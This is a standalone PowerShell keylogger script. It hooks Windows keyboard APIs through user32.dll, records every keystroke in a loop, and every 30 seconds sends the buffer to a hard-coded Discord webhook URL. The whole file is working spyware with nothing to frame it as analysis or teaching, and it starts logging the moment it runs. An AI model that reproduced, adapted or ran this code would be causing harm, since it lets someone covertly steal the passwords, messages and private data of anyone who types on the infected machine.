
$webhookUrl = "https://discord.com/api/webhooks/1178054800059945121/vQjFMuqKZkGLl2O_NGbt7uej-UXt5Xlyzxm6nwrbnLIdZT0vMqXVDIpnl0BQWw_uuU9p"
$buffer = ""
$timer = [System.Diagnostics.Stopwatch]::StartNew()

function Send-DataToWebhook($data) {
    $payload = @{
        content = $data
    }
    $payloadJson = $payload | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payloadJson
    } catch {
        Write-Host "Error sending payload to Discord: $_" -ForegroundColor Red
    }
}

function Start-KeyLogger() {
    # Signatures for API Calls
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    while ($true) {
        Start-Sleep -Milliseconds 1

        
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)

            if ($state -eq -32767) {
                $null = [console]::CapsLock

                $virtualKey = $API::MapVirtualKey($ascii, 3)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName System.Text.StringBuilder

                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success) {
                    $key = $mychar.ToString()

                    if ($key -eq "{DELETE}") {
                        $key = "{BACKSPACE}"
                    }
                    elseif ($key -eq "{CTRL}") {
                        $key = "{CTRL}"
                    }
                    elseif ($key -eq "{V}") {
                        $key = "{CTRL+V}"
                    }
                    elseif ($key -eq "{C}") {
                        $key = "{CTRL+C}"
                    }

                    $buffer += $key
                }
            }
        }

        $elapsedMilliseconds = $timer.Elapsed.TotalMilliseconds

        if ($elapsedMilliseconds -ge 30000 -and $buffer.Length -gt 0) {
            $data = $buffer
            $buffer = ""
            Send-DataToWebhook($data)
            $timer.Restart()
        }
    }
}


Start-KeyLogger